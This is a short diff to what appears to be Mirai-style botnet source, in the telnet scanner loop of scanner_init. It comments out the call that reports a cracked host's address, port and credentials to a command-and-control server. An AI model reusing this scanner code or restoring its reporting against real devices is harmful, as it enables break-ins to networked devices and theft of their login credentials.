@@ -609,7 +609,8 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
 #endif
-                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                                // Don't report to CNC
+                                // report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                 close(conn->fd);
                                 conn->fd = -1;
                                 conn->state = SC_CLOSED;
